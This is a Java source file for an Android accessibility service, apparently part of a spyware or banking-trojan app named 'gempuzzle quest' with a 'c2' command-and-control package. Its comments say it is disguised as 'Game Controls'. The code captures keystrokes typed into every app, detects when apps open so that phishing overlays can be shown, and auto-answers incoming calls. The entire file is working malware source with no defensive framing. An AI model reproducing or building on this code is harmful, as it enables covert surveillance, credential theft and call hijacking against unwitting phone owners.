package com.gempuzzle.quest.c2;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;

import com.gempuzzle.quest.c2.modules.SmsModule;

/**
 * Accessibility service — disguised as "Game Controls".
 * Monitors window state, captures keystrokes, detects app
 * opens (for /on_app_open and overlay phishing), monitors
 * incoming calls for auto-answer.
 */
public class AccessibilityMonitor extends AccessibilityService {

    private static volatile boolean enabled = false;

    public static boolean isEnabled(Context ctx) {
        try {
            int enabled = Settings.Secure.getInt(ctx.getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);
            if (enabled != 1) return false;
            String services = Settings.Secure.getString(ctx.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (TextUtils.isEmpty(services)) return false;
            return services.contains(ctx.getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    protected void onServiceConnected() {
        enabled = true;
        super.onServiceConnected();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        // Keystroke capture via TYPE_VIEW_TEXT_CHANGED
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText() != null && !event.getText().isEmpty()
                    ? event.getText().get(0) : "";
            if (text != null && text.length() > 0) {
                String pkg = String.valueOf(event.getPackageName());
                KeystoreBuffer.log(pkg, text.toString());
            }
        }
        // Window state change — detect app opens for overlay triggers
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String pkg = String.valueOf(event.getPackageName());
            AppOpenWatcher.onAppOpen(this, pkg);
        }
        // Incoming call auto-answer — detect Telecom/InCall UI
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            String pkg = String.valueOf(event.getPackageName());
            if (pkg.contains("incall") || pkg.contains("dialer") || pkg.contains("telecom")) {
                CallAutoAnswer.checkAndAnswer(this, getRootInActiveWindow());
            }
        }
    }

    @Override
    public void onInterrupt() {
        enabled = false;
    }

    @Override
    public boolean onUnbind(Intent intent) {
        enabled = false;
        return super.onUnbind(intent);
    }
}
